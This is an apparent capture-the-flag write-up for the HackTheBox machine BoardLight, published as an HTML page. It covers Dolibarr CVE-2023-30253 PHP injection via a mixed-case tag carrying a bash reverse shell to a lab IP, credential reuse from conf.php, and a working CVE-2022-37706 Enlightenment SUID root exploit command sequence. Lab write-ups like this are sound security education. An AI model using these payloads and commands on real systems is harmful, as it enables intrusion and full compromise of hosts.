@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/boardlight.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] BoardLight - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>BoardLight</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">BoardLight</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">dolibarr cve-2023-30253 rce</span>
+                    <span class="tag">case-bypass php injection</span>
+                    <span class="tag">conf.php credential reuse</span>
+                    <span class="tag">enlightenment suid lpe (cve-2022-37706)</span>
+                </div>
+
+                <img src="../../images/hackthebox/boardlight/index.png" alt="BoardLight Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+
+                <p>Straightforward easy box, but a clean chain. The foothold is a Dolibarr CRM tucked away on a subdomain that still ships default credentials and a known PHP injection. From there the whole thing is credential reuse: the DB password in <code>conf.php</code> is also a system user's password, and root falls to a SUID binary from the Enlightenment desktop that most people never think to check.</p>
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Only 22 and 80 are open, a plain Apache on Ubuntu.</p>
+
+                <pre><code>[BoardLight] sudo nmap -Pn -v -T5 --min-rate 2000 -sSVC -p- -oN nmap 10.129.60.73
+Nmap scan report for 10.129.60.73
+Host is up (0.16s latency).
+Not shown: 65391 closed tcp ports (reset), 142 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The web app on port 80 is a company site for a firm called "Board" and points at <code>board.htb</code>, so I added it to <code>/etc/hosts</code>. The site itself is mostly static (a marketing page with a contact form), nothing exploitable on the surface, so the next move is to look for virtual hosts.</p>
+
+                <p>Fuzzing the <code>Host</code> header with <code>ffuf</code> and filtering out the default response size (6 words) turns up one live subdomain, <code>crm.board.htb</code>.</p>
+
+                <pre><code>[BoardLight] ffuf -u http://board.htb -H 'Host: FUZZ.board.htb' -mc all -w /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt -fw 6243
+
+crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 592ms]</code></pre>
+
+                <p>After adding <code>crm.board.htb</code> to <code>/etc/hosts</code> as well, the subdomain serves a login page for Dolibarr, an open source ERP/CRM. The footer gives away the version: <strong>Dolibarr 17.0.0</strong>.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>Dolibarr 17.0.0 is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2023-30253">CVE-2023-30253</a>, a PHP code injection in the website builder module. The catch is that it needs an authenticated account with website permissions, but this instance never changed the install defaults, so <code>admin</code> / <code>admin</code> logs straight in.</p>
+
+                <p>The bug itself is a case-sensitivity flaw in Dolibarr's content filter. When you save a website page, Dolibarr strips out <code>&lt;?php</code> tags to stop you from planting server-side code. The filter only matches the lowercase form, so writing the opening tag with mixed case like <code>&lt;?pHp</code> slips past the check while the PHP interpreter still treats it as a valid open tag. Whatever you put between the tags gets executed when the public version of the page is rendered.</p>
+
+                <p>I used nikn0laty's PoC (<a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a>), which automates the whole flow: it logs in, creates a website, adds a page, then edits the page source to inject a mixed-case PHP tag carrying a reverse shell, and finally requests the public page URL to fire it.</p>
+
+                <p>The injected page content is essentially this, a bash reverse shell wrapped in the case-bypassed tag:</p>
+
+                <pre><code>&lt;section id="mysection1" contenteditable="true"&gt;
+    &lt;?pHp system("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.208/4444 0&gt;&amp;1'"); ?&gt;
+&lt;/section&gt;</code></pre>
+
+                <p>Start a listener, run the exploit against the CRM, and the public page request triggers the shell.</p>
+
+                <pre><code>(env) [BoardLight] python3 exploit.py http://crm.board.htb admin admin 10.10.15.208 4444
+[*] Trying authentication...
+[**] Login: admin
+[**] Password: admin
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection</code></pre>
+
+                <pre><code>[BoardLight] nc -lvnp 4444
+Connection received on 10.129.60.73
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>Foothold as <code>www-data</code>. Dolibarr keeps its configuration, including the database credentials, in <code>conf.php</code>, and it is world readable in the web root:</p>
+
+                <pre><code>www-data@boardlight:~$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
+$dolibarr_main_db_host='localhost';
+$dolibarr_main_db_name='dolibarr';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+$dolibarr_main_db_type='mysqli';</code></pre>
+
+                <p>The interesting part is the password, <code>serverfun2$2023!!</code>. Checking <code>/etc/passwd</code> there is a regular user <code>larissa</code> on the box, and people reuse passwords. The DB password works for her account, so this is a straight <code>su</code> away from the user flag:</p>
+
+                <pre><code>www-data@boardlight:~$ su larissa
+Password: serverfun2$2023!!
+larissa@boardlight:~$ id
+uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
+larissa@boardlight:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>With a proper session as <code>larissa</code>, the first thing worth checking is SUID binaries. Most of the list is the usual Ubuntu set, but a handful belong to <strong>Enlightenment</strong>, the window manager, which is unusual to see on a server:</p>
+
+                <pre><code>larissa@boardlight:~$ find / -perm /4000 2>/dev/null
+...
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+...</code></pre>
+
+                <p>Enlightenment ships <code>enlightenment_sys</code> as a root SUID helper for privileged system actions like mounting devices. It is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37706">CVE-2022-37706</a>, a local privilege escalation.</p>
+
+                <p>The root cause is in how the helper builds and runs a <code>mount</code> command from paths it receives. It fails to sanitise a path that contains <code>/dev/../</code> followed by a space, which lets you smuggle a second token into the command it executes as root. By crafting a path like <code>"/dev/../tmp/;/tmp/exploit"</code>, the trailing <code>/tmp/exploit</code> is treated as its own command and runs with root privileges. So the trick is to drop a tiny script that just spawns a shell, mark it executable, and feed the crafted path to <code>enlightenment_sys</code>.</p>
+
+                <p>This is the public exploit for CVE-2022-37706 (<a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">MaherAzzouzi/CVE-2022-37706-LPE-exploit</a>), reduced to the commands that matter:</p>
+
+                <pre><code>larissa@boardlight:/tmp$ file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
+larissa@boardlight:/tmp$ mkdir -p /tmp/net
+larissa@boardlight:/tmp$ mkdir -p "/dev/../tmp/;/tmp/exploit"
+larissa@boardlight:/tmp$ echo "/bin/sh" > /tmp/exploit
+larissa@boardlight:/tmp$ chmod a+x /tmp/exploit
+larissa@boardlight:/tmp$ ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)</code></pre>
+
+                <p>The <code>mount</code> part fails as expected, but by then the injected <code>/tmp/exploit</code> has already run as root and dropped us into a root shell. From here it is just reading <code>/root/root.txt</code>.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // BoardLight</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
